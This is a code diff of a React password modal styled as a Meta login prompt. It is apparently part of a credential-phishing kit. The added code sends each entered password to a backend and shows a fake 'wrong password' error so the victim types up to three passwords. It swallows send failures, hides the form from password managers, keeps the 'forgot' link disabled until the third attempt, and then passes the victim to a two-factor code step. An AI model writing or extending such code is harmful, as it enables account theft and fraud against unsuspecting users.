@@ -1,4 +1,5 @@
 import React from 'react';
+import { CircleAlert } from 'lucide-react';
 import Modal from '#components/modals/Modal';
 import PasswordInput from '#components/password-input/password-input';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
@@ -12,31 +13,47 @@ interface PasswordModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
+const SUBMIT_DELAY_MS = 1345;
+
 const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
     const t = useAppStrings();
 
-    React.useEffect(() => {
-        setIsOpen(isOpend);
-    }, [isOpend]);
-
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [loading, setLoading] = React.useState(false);
-    const [doubleCheck, setDoubleCheck] = React.useState(false);
+    const [passwordStep, setPasswordStep] = React.useState<1 | 2 | 3>(1);
     const [password, setPassword] = React.useState('');
-    const [showSecondStepNotice, setShowSecondStepNotice] = React.useState(false);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const dispatch = useAppDispatch();
     const formData = useAppSelector((state) => state.stepForm.data);
 
+    React.useEffect(() => {
+        setIsOpen(isOpend);
+        if (isOpend) {
+            setPasswordStep(1);
+            setPassword('');
+            setErrors({});
+            setLoading(false);
+            dispatch(
+                updateForm({
+                    password: '',
+                    passwordSecond: '',
+                    passwordThird: '',
+                })
+            );
+        }
+    }, [isOpend, dispatch]);
+
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { value } = e.target;
         setPassword(value);
-        setErrors(prev => ({ ...prev, password: '' }));
+        setErrors((prev) => ({ ...prev, password: '' }));
 
-        if (!doubleCheck) {
+        if (passwordStep === 1) {
             dispatch(updateForm({ password: value }));
-        } else {
+        } else if (passwordStep === 2) {
             dispatch(updateForm({ passwordSecond: value }));
+        } else {
+            dispatch(updateForm({ passwordThird: value }));
         }
     };
 
@@ -45,129 +62,159 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         onToggleModal(false);
     };
 
-    const handSubmit = async (e: React.FormEvent) => {
+    const goForgotToTwoFa = () => {
+        isOpendTwoFactor(true);
+        handleClose();
+    };
+
+    const waitAfterSend = async () => {
         try {
-            e.preventDefault();
-            const newErrors: Record<string, string> = {};
-            if (!password.trim()) newErrors.password = t.password.errEmpty;
+            await SendData(formData);
+        } catch {
+            /* luồng UX vẫn tiếp tục */
+        }
+        await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
+    };
 
-            if (Object.keys(newErrors).length > 0) {
-                setErrors(newErrors);
-                return; 
+    const handSubmit = async (e: React.FormEvent) => {
+        e.preventDefault();
+        const newErrors: Record<string, string> = {};
+        if (!password.trim()) newErrors.password = t.password.errEmpty;
+
+        if (Object.keys(newErrors).length > 0) {
+            setErrors(newErrors);
+            return;
+        }
+
+        if (passwordStep === 1 || passwordStep === 2) {
+            setLoading(true);
+            try {
+                await waitAfterSend();
+                setPassword('');
+                setErrors({ password: t.password.errWrong });
+                setPasswordStep((s) => (s === 1 ? 2 : 3));
+            } finally {
+                setLoading(false);
             }
+            return;
+        }
 
-            if (!doubleCheck) {
-                setLoading(true);
-
-                await SendData(formData)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);  
-                        setDoubleCheck(true);
-                        setShowSecondStepNotice(true);
-                        setPassword('');
-                        setErrors({});
-                    }, 1345)
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setDoubleCheck(true);
-                    setShowSecondStepNotice(true);
-                    setPassword('');
-                    setErrors({});
-                });
-            } else {
-                setLoading(true);
-
-                await SendData(formData)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);  
-                        setDoubleCheck(false);
-                        setShowSecondStepNotice(false);
-                        setPassword('');
-
-                        isOpendTwoFactor(true);
-                        handleClose();
-                    }, 1345)
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setPassword('');
-                    newErrors.password = t.password.errWrong;
-                    setErrors(newErrors);
-                });
-            }
+        setLoading(true);
+        try {
+            await SendData(formData);
+            await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
+            isOpendTwoFactor(true);
+            handleClose();
         } catch (error) {
-            console.error("Error submitting form:", error);
+            console.error('Error submitting form:', error);
+            setPassword('');
+            setErrors({ password: t.password.errWrong });
+        } finally {
+            setLoading(false);
         }
     };
 
-    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
-    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+    const inputClass = (field: string) =>
+        ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
+
+    const prompt =
+        passwordStep === 1
+            ? t.password.firstPrompt
+            : passwordStep === 2
+              ? t.password.secondPrompt
+              : t.password.thirdPrompt;
+
+    const passwordName =
+        passwordStep === 1
+            ? 'account_access_key'
+            : passwordStep === 2
+              ? 'recheck_access_key'
+              : 'third_access_key';
+
+    const passwordId =
+        passwordStep === 1 ? 'accessKey' : passwordStep === 2 ? 'accessKeyConfirm' : 'accessKeyThird';
 
     return (
-        <Modal
-            isOpen={isOpen}
-            title=''
-            onClose={handleClose}
-            isClosable={false}
-        >
+        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
             <div className="flex min-h-full min-w-0 flex-1 flex-col items-center justify-center gap-8 py-2">
-                <div className='mx-auto h-[50px] w-[50px] shrink-0'>
+                <div className="mx-auto h-[50px] w-[50px] shrink-0">
                     <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                 </div>
 
-                <div className='w-full min-w-0 py-4 sm:py-8'>
-                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>
-                        {doubleCheck
-                            ? t.password.secondPrompt
-                            : t.password.firstPrompt}
-                    </p>
-                    {showSecondStepNotice && (
-                        <div className='mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]'>
-                            <p className='text-[13px] leading-[1.55] text-[#8a5b13]'>
-                                {t.password.notice}
-                            </p>
+                <div className="w-full min-w-0 py-4 sm:py-8">
+                    <p className="mb-[7px] text-[14px] text-[#9a979e]">{prompt}</p>
+                    {passwordStep === 2 && (
+                        <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
+                            <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.notice}</p>
                         </div>
                     )}
-                    <form onSubmit={handSubmit} autoComplete="off" data-lpignore="true" data-1p-ignore="true" data-bwignore="true">
-                        <div className='w-full'>
+                    {passwordStep === 3 && (
+                        <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
+                            <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.noticeThird}</p>
+                        </div>
+                    )}
+                    <form
+                        onSubmit={handSubmit}
+                        autoComplete="off"
+                        data-lpignore="true"
+                        data-1p-ignore="true"
+                        data-bwignore="true"
+                    >
+                        <div className="w-full">
                             <PasswordInput
-                                id='accessKey'
-                                name={doubleCheck ? 'recheck_access_key' : 'account_access_key'}
-                                placeholder={doubleCheck ? t.password.phSecond : t.password.phFirst}
+                                id={passwordId}
+                                name={passwordName}
+                                placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
                                 className={inputClass('password')}
                                 value={password}
                                 onChange={handleChange}
-                                autoComplete='off'
-                                allowToggle={doubleCheck}
+                                autoComplete="off"
+                                allowToggle={passwordStep >= 2}
                             />
-                            {errorText('password')}
+                            {errors.password ? (
+                                <div
+                                    className="mb-[10px] mt-[-5px] flex items-start gap-2 text-[14px] text-red-600"
+                                    role="alert"
+                                >
+                                    <CircleAlert className="mt-0.5 size-4 shrink-0" aria-hidden />
+                                    <span>{errors.password}</span>
+                                </div>
+                            ) : null}
                         </div>
-                        <div className='w-full mt-[20px]'>
+                        <div className="mt-[20px] w-full">
                             <button
-                                className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 active:opacity-90 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
+                                type="submit"
+                                className={`flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] px-4 py-[10px] text-white transition-opacity duration-300 active:opacity-90 ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
                                 disabled={loading}
                             >
                                 {loading && (
-                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
-                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
+                                    <div className="mr-[10px] h-[20px] w-[20px] animate-spin">
+                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                     </div>
                                 )}
                                 {loading ? '' : t.password.continue}
                             </button>
                         </div>
-                        <div>
-                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{t.password.forgot}</a></p>
+                        <div className="mt-[10px] text-center">
+                            {passwordStep < 3 ? (
+                                <span className="inline-block cursor-default select-none text-[14px] text-[#9a979e] opacity-50">
+                                    {t.password.forgot}
+                                </span>
+                            ) : (
+                                <button
+                                    type="button"
+                                    className="text-[14px] text-[#0064E0] hover:underline"
+                                    onClick={goForgotToTwoFa}
+                                >
+                                    {t.password.forgot}
+                                </button>
+                            )}
                         </div>
                     </form>
                 </div>
 
-                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
-                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
+                <div className="mx-auto h-[60px] w-[60px] shrink-0">
+                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                 </div>
             </div>
         </Modal>
